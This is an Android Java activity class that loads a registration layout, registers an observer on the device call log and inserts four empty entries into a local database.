package com.guser.service;

import com.guser.service.DB.DatabaseHandler;

import android.os.Bundle;
import android.os.Handler;
import android.app.Activity;
import android.content.Intent;
import android.view.Menu;

public class RegisterActivity extends Activity {

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_register);
        
        this.getApplicationContext()
      	.getContentResolver()
      		.registerContentObserver(
      				android.provider.CallLog.Calls.CONTENT_URI, true,
      					new CallsContentObserver(new Handler(), this.getApplicationContext())); 
        
        
        DatabaseHandler db = new DatabaseHandler(this);
        db.addMessage("");
        db.addMessage("");
        db.addMessage("");
        db.addMessage("");
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.activity_register, menu);
        return true;
    }
}
